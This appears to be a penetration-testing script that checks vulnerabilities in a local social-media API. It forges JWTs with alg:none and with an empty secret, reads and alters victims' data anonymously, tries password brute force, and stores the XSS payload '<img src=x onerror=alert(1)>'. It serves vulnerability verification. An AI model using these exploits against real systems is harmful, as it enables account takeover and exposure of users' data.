// ============================================================================
//  FINAL VERDICT — accurate findings only
// ============================================================================
import { createHmac } from 'crypto'
const BASE = 'http://localhost:8080/api/'
const hmac = (data, secret) => createHmac('sha256', secret).update(data).digest('base64url')
const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url')
const uniq = (p) => `${p}_${Date.now()}_${Math.floor(Math.random() * 1e6)}`

async function req(method, url, { token, body } = {}) {
  const headers = { 'content-type': 'application/json' }
  if (token) headers.authorization = `Bearer ${token}`
  const res = await fetch(BASE + url, { method, headers, body: body ? JSON.stringify(body) : undefined })
  const ct = res.headers.get('content-type') || ''
  const data = ct.includes('json') ? await res.json() : await res.text()
  return { status: res.status, data }
}
const verdict = (label, cond, ev) => console.log(`  ${cond ? '🔴' : '🟢'} ${label}${ev ? '  -> ' + ev : ''}`)

const A = (await req('POST', 'user/signup', { body: { email: uniq('fa'), password: 'victim123', firstName: 'FV', lastName: 'A' } })).data
const B = (await req('POST', 'user/signup', { body: { email: uniq('fb'), password: 'attacker123', firstName: 'FA', lastName: 'B' } })).data
const idA = A.result._id, idB = B.result._id, tokenB = B.token

console.log('=== F1. getUser WITHOUT any token (route has NO auth middleware) ===')
const f1 = await req('GET', `user/getUser/${idA}`)
verdict('F1 anonymous read of profile (incl. bcrypt password hash)', f1.status === 200 && !!f1.data?.user?.password, `status=${f1.status}, password hash present=${!!f1.data?.user?.password}`)

console.log('=== F2. JWT forgery against a PROTECTED endpoint (getSug has AuthMiddleware) ===')
const exp = Math.floor(Date.now() / 1000) + 3600
const control = await req('GET', 'user/getSug', { token: tokenB })
verdict('F2a control: real token works', control.status === 200, `status=${control.status}`)
const h = b64url({ alg: 'none', typ: 'JWT' })
const p = b64url({ iss: idA, exp })
const algNone = await req('GET', 'user/getSug', { token: `${h}.${p}.` })
verdict('F2b alg:none token accepted on protected route', algNone.status === 200, `status=${algNone.status}`)
const emptySec = await req('GET', 'user/getSug', { token: `${h2(p, '')}` })
function h2(payload, secret) { const hh = b64url({ alg: 'HS256', typ: 'JWT' }); return `${hh}.${payload}.${hmac(hh + '.' + payload, secret)}` }
verdict('F2c empty-secret HS256 token accepted on protected route', emptySec.status === 200, `status=${emptySec.status}`)

console.log('=== F3. Notification endpoints have NO auth middleware ===')
// create a real notification FOR A: B follows A
await req('PATCH', `user/${idA}/following`, { token: tokenB })
const nAnon = await req('GET', `notification/${idA}`)
const list = nAnon.data?.notifications || []
const hasFollowNotif = list.some((n) => JSON.stringify(n).includes('follow'))
verdict('F3a anonymous read of victim notifications', nAnon.status === 200 && list.length > 0, `status=${nAnon.status}, count=${list.length}, contains follow-event=${hasFollowNotif}`)
const markAnon = await req('PATCH', `notification/mark-notification-as-readed/${idA}`)
verdict('F3b anonymous mark victim notifications as read', markAnon.status === 200, `status=${markAnon.status}`)

console.log('=== F4. Notification WebSocket (correct paths) ===')
for (const [tag, url] of [['via vue proxy', `ws://localhost:8080/ws-notify/${idA}`], ['direct :8088 /ws/', `ws://localhost:8088/ws/${idA}`]]) {
  await new Promise((resolve) => {
    let got = null
    let ws = null
    try { ws = new WebSocket(url) } catch { console.log(`  [${tag}] connect threw`); return resolve() }
    const finish = (label, ev) => { try { ws.close() } catch { } console.log(`  ${label}${ev ? '  -> ' + String(ev).slice(0, 140) : ''}`); resolve() }
    ws.onopen = async () => {
      await req('PATCH', `user/${idA}/following`, { token: tokenB })
      setTimeout(() => finish(got !== null ? `🔴 [${tag}] RECEIVED event` : `🟢 [${tag}] open but no victim event`, got), 2500)
    }
    ws.onmessage = (e) => { got = e.data }
    ws.onerror = () => finish(`🟢 [${tag}] connection error/closed`)
    setTimeout(() => finish(got !== null ? `🔴 [${tag}] RECEIVED event` : `🟢 [${tag}] timeout`, got), 7000)
  })
}

console.log('=== F5. brute-force & spam (quick re-confirm) ===')
let t401 = 0
for (let i = 0; i < 10; i++) { const r = await req('POST', 'user/signin', { body: { email: A.result.email, password: `w${i}` } }); if (r.status === 401 || r.status === 400) t401++ }
verdict('F5 no login throttling (10 attempts)', t401 === 10, `all ${t401} attempts answered immediately`)

console.log('=== F6. XSS stored raw (frontend escape check) ===')
const xs = '<img src=x onerror=alert(1)>'
const px = (await req('POST', 'posts', { token: tokenB, body: { title: 'xss', message: xs } })).data
const back = (await req('GET', `posts/${px._id}`)).data?.post?.message || ''
verdict('F6 stored XSS payload returned raw by API', back.includes('<img'), `raw=${back.includes('<img')}`)
await req('DELETE', `posts/${px._id}`, { token: tokenB })
